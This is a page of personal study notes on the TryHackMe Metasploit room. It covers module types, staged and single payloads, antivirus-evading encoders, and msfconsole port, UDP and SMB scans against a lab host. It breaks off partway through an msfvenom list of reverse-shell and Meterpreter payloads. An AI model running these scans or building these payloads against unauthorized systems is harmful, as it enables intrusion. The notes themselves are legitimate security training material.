<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Metasploit  Docs: https://docs.metasploit.com/
Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation."><title>TryHackMe - Metasploit</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=ico href=https://pietraferreira.github.io/quartz//favicon.ico><link href=https://pietraferreira.github.io/quartz/styles.5c5e8e492b01ec554ac9a86fe1e7f16f.min.css rel=stylesheet><link href=https://pietraferreira.github.io/quartz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://pietraferreira.github.io/quartz/js/darkmode.a93be4d36d657139e957880e320dd457.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/util.fa8e74b4065b97e6980a72cc472e436f.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/contrib/copy-tex.min.js integrity=sha384-ww/583aHhxWkz5DEVn6OKtNiIaLi2iBRNZXfJRiY1Ai7tnJ9UXpEsyvOITVpTl4A crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://pietraferreira.github.io/quartz/js/popover.9b72b70bd35617d0635e9d15463662b2.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script src=https://pietraferreira.github.io/quartz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const SEARCH_ENABLED=!1,PRODUCTION=!0,BASE_URL="https://pietraferreira.github.io/quartz/",fetchData=Promise.all([fetch("https://pietraferreira.github.io/quartz/indices/linkIndex.3c7e142e22168f58480791f74b411955.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://pietraferreira.github.io/quartz/indices/contentIndex.b9f79c2e3b636bd3e22ac7aed36f6ad9.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://pietraferreira.github.io/quartz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://pietraferreira.github.io/quartz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],macros:{'‚Äô':"'"},throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/pietraferreira.github.io\/quartz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://pietraferreira.github.io/quartz/js/full-text-search.51f0b1753e9b30839d053f8a98cc20d1.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://pietraferreira.github.io/quartz/>ü™Ö Morioh</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>TryHackMe - Metasploit</h1><p class=meta>Last updated
Nov 24, 2022
<a href=https://github.com/jackyzha0/quartz/tree/hugo/content/notes/general/thm-metasploit.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://pietraferreira.github.io/quartz/tags/thm/>Thm</a></li><li><a href=https://pietraferreira.github.io/quartz/tags/metasploit/>Metasploit</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#main-components>Main Components</a></li><li><a href=#exploit-ranking>Exploit Ranking</a></li><li><a href=#scanning>Scanning</a><ol><li><a href=#udp-service-identification>UDP service Identification</a></li><li><a href=#udp-scan>UDP scan</a></li><li><a href=#smb-scans>SMB Scans</a></li></ol></li><li><a href=#msfvenom>MsfVenom</a><ol><li><a href=#output-formats>Output formats</a></li><li><a href=#encoders>Encoders</a></li><li><a href=#handlers>Handlers</a></li><li><a href=#other-payloads>Other Payloads</a></li></ol></li><li><a href=#meterpreter>Meterpreter</a></li></ol></nav></details></aside><a href=#metasploit><h1 id=metasploit><span class=hanchor arialabel=Anchor># </span>Metasploit</h1></a><hr><p>Docs:
<a href=https://docs.metasploit.com/ rel=noopener>https://docs.metasploit.com/</a></p><p>Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.</p><p>The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.</p><p>The main components of the Metasploit Framework can be summarised as follows;</p><ul><li><strong>msfconsole</strong>: The main command-line interface.</li><li><strong>Modules</strong>: supporting modules such as exploits, scanners, payloads, etc.</li><li><strong>Tools</strong>: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset.</li></ul><a href=#main-components><h2 id=main-components><span class=hanchor arialabel=Anchor># </span>Main Components</h2></a><ul><li><strong>Exploit:</strong> A piece of code that uses a vulnerability present on the target system.</li><li><strong>Vulnerability:</strong> A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.</li><li><strong>Payload:</strong> An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.</li></ul><p>Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole).</p><p><strong>Auxiliary</strong>: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/aaeb4ff4aa7fc33289b2bb581d874f16.png width=auto alt></p><p><strong>Encoders</strong>: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.</p><p>Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/814490c07d05616009169c80cbb173a5.png width=auto alt></p><p><strong>Evasion</strong>: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.</p><p>On the other hand, ‚Äúevasion‚Äù modules will try that, with more or less success.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/fe66d8ad4c915fa496a20e6f6291a0ad.png width=auto alt></p><p><strong>Exploits</strong>: Exploits, neatly organised by target system.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/b940db3ff6ec430322206f2e161114fc.png width=auto alt></p><p><strong>NOPs</strong>: NOPs (No OPeration) do nothing, literally.</p><p>They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/71c6dee3ef13c5bc841aac92ce3253d7.png width=auto alt></p><p><strong>Payloads</strong>: Payloads are codes that will run on the target system.</p><p>Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.</p><p>Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a &ldquo;shell&rdquo;. Metasploit offers the ability to send different payloads that can open shells on the target system.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a4c9a90b50c7c46a6c8c1a5f78500ad1.png width=auto alt></p><p>You will see three different directories under payloads: singles, stagers and stages.</p><ul><li><strong>Singles:</strong> Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.</li><li><strong>Stagers:</strong> Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. ‚ÄúStaged payloads‚Äù will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.</li><li><strong>Stages:</strong> Downloaded by the stager. This will allow you to use larger sized payloads.</li></ul><p>Metasploit has a subtle way to help you identify single (also called ‚Äúinline‚Äù) payloads and staged payloads.</p><ul><li><code>generic/shell\_reverse\_tcp</code></li><li><code>windows/x64/shell/reverse\_tcp</code></li></ul><p>Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the ‚Äú_‚Äù between ‚Äúshell‚Äù and ‚Äúreverse‚Äù. While the latter is a staged payload, as indicated by the ‚Äú/‚Äù between ‚Äúshell‚Äù and ‚Äúreverse‚Äù.</p><p><strong>Post:</strong> Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.</p><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/fa98b51a9b3862dc43eb0d3007057290.png width=auto alt></p><a href=#exploit-ranking><h2 id=exploit-ranking><span class=hanchor arialabel=Anchor># </span>Exploit Ranking</h2></a><p><img src=https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/a88c8d37283878e01447853a68578deb.png width=auto alt></p><a href=#scanning><h2 id=scanning><span class=hanchor arialabel=Anchor># </span>Scanning</h2></a><p>To port scan can use:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           msf6 &gt; search portscan
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching Modules
</span></span><span class=line><span class=cl><mark>=</mark><mark>=</mark><mark>=</mark>=
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   #  Name                                              Disclosure Date  Rank    Check  Description
</span></span><span class=line><span class=cl>   -  ----                                              ---------------  ----    -----  -----------
</span></span><span class=line><span class=cl>   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
</span></span><span class=line><span class=cl>   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
</span></span><span class=line><span class=cl>   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
</span></span><span class=line><span class=cl>   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
</span></span><span class=line><span class=cl>   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
</span></span><span class=line><span class=cl>   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
</span></span><span class=line><span class=cl>   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP &#34;XMas&#34; Port Scanner
</span></span><span class=line><span class=cl>   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Interact with a module by name or index, for example use 7 or use auxiliary/scanner/sap/sap_router_portscanner
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 &gt;
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>Port scanning modules will require you to set a few options:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           msf6 auxiliary(scanner/portscan/tcp) &gt; show options
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Module options (auxiliary/scanner/portscan/tcp):
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Name         Current Setting  Required  Description
</span></span><span class=line><span class=cl>   ----         ---------------  --------  -----------
</span></span><span class=line><span class=cl>   CONCURRENCY  10               yes       The number of concurrent ports to check per host
</span></span><span class=line><span class=cl>   DELAY        0                yes       The delay between connections, per thread, in milliseconds
</span></span><span class=line><span class=cl>   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
</span></span><span class=line><span class=cl>   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
</span></span><span class=line><span class=cl>   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&#39;
</span></span><span class=line><span class=cl>   THREADS      1                yes       The number of concurrent threads (max one per host)
</span></span><span class=line><span class=cl>   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 auxiliary(scanner/portscan/tcp) &gt;
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>CONCURRENCY:</strong> Number of targets to be scanned simultaneously.</li><li><strong>PORTS:</strong> Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.</li><li><strong>RHOSTS:</strong> Target or target network to be scanned.</li><li><strong>THREADS:</strong> Number of threads that will be used simultaneously. More threads will result in faster scans.</li></ul><p>You can directly perform Nmap scans from the msfconsole prompt as shown below faster:</p><p>Using Nmap from the Msfconsole prompt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           msf6 &gt; nmap -sS 10.10.12.229
</span></span><span class=line><span class=cl>[*] exec: nmap -sS 10.10.12.229
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-20 03:54 BST
</span></span><span class=line><span class=cl>Nmap scan report for ip-10-10-12-229.eu-west-1.compute.internal (10.10.12.229)
</span></span><span class=line><span class=cl>Host is up (0.0011s latency).
</span></span><span class=line><span class=cl>Not shown: 992 closed ports
</span></span><span class=line><span class=cl>PORT      STATE SERVICE
</span></span><span class=line><span class=cl>135/tcp   open  msrpc
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds
</span></span><span class=line><span class=cl>3389/tcp  open  ms-wbt-server
</span></span><span class=line><span class=cl>49152/tcp open  unknown
</span></span><span class=line><span class=cl>49153/tcp open  unknown
</span></span><span class=line><span class=cl>49154/tcp open  unknown
</span></span><span class=line><span class=cl>49158/tcp open  unknown
</span></span><span class=line><span class=cl>MAC Address: 02:CE:59:27:C8:E3 (Unknown)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 64.19 seconds
</span></span><span class=line><span class=cl>msf6 &gt;
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>As for information gathering, if your engagement requires a speedier approach to port scanning, Metasploit may not be your first choice. However, a number of modules make Metasploit a useful tool for the scanning phase.</p><a href=#udp-service-identification><h3 id=udp-service-identification><span class=hanchor arialabel=Anchor># </span>UDP service Identification</h3></a><p>The <code>scanner/discovery/udp_sweep</code> module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.</p><a href=#udp-scan><h3 id=udp-scan><span class=hanchor arialabel=Anchor># </span>UDP scan</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           msf6 auxiliary(scanner/discovery/udp_sweep) &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[*] Sending 13 probes to 10.10.12.229-&gt;10.10.12.229 (1 hosts)
</span></span><span class=line><span class=cl>[*] Discovered NetBIOS on 10.10.12.229:137 (JON-PC::U :WORKGROUP::G :JON-PC::U :WORKGROUP::G :WORKGROUP::U :__MSBROWSE__::G :02:ce:59:27:c8:e3)
</span></span><span class=line><span class=cl>[*] Scanned 1 of 1 hosts (100% complete)
</span></span><span class=line><span class=cl>[*] Auxiliary module execution completed
</span></span><span class=line><span class=cl>msf6 auxiliary(scanner/discovery/udp_sweep) &gt;
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><a href=#smb-scans><h3 id=smb-scans><span class=hanchor arialabel=Anchor># </span>SMB Scans</h3></a><p>Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be <code>smb_enumshares</code> and <code>smb_version</code> but please spend some time to identify scanners that the Metasploit version installed on your system offers.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>           msf6 auxiliary<span class=o>(</span>scanner/smb/smb_version<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.10.12.229:445      - Host is running Windows <span class=m>7</span> Professional SP1 <span class=o>(</span>build:7601<span class=o>)</span> <span class=o>(</span>name:JON-PC<span class=o>)</span> <span class=o>(</span>workgroup:WORKGROUP <span class=o>)</span> <span class=o>(</span>signatures:optional<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.10.12.229:445      - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Auxiliary module execution completed
</span></span><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/smb/smb_version<span class=o>)</span> &gt;
</span></span><span class=line><span class=cl>        
</span></span></code></pre></td></tr></table></div></div><p>When performing service scans, it would be important not to omit more &ldquo;exotic&rdquo; services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.).</p><a href=#msfvenom><h2 id=msfvenom><span class=hanchor arialabel=Anchor># </span>MsfVenom</h2></a><p>Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.</p><p>Msfvenom will allow you to access all payloads available in the Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).</p><p>Msfvenom payloads:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>           root@ip-10-10-186-44:~# msfvenom -l payloads 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Framework Payloads (562 total) [--payload ]
</span></span><span class=line><span class=cl><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark><mark>=</mark>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Name                                                Description
</span></span><span class=line><span class=cl>    ----                                                -----------
</span></span><span class=line><span class=cl>    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
</span></span><span class=line><span class=cl>    aix/ppc/shell_find_port                             Spawn a shell on an established connection
</span></span><span class=line><span class=cl>    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
</span></span><span class=line><span class=cl>    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
</span></span><span class=line><span class=cl>    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
</span></span><span class=line><span class=cl>    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
</span></span><span class=line><span class=cl>    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
</span></span><span class=line><span class=cl>    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
</span></span><span class=line><span class=cl>    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
</span></span><span class=line><span class=cl>    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
</span></span><span class=line><span class=cl>    android/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP
</span></span><span class=line><span class=cl>    android/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS
</span></span><span class=line><span class=cl>    android/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager
</span></span><span class=line><span class=cl>    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)
</span></span><span class=line><span class=cl>    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)
</span></span><span class=line><span class=cl>    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)
</span></span><span class=line><span class=cl>    apple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell
</span></span><span class=line><span class=cl>    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
</span></span><span class=line><span class=cl>    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
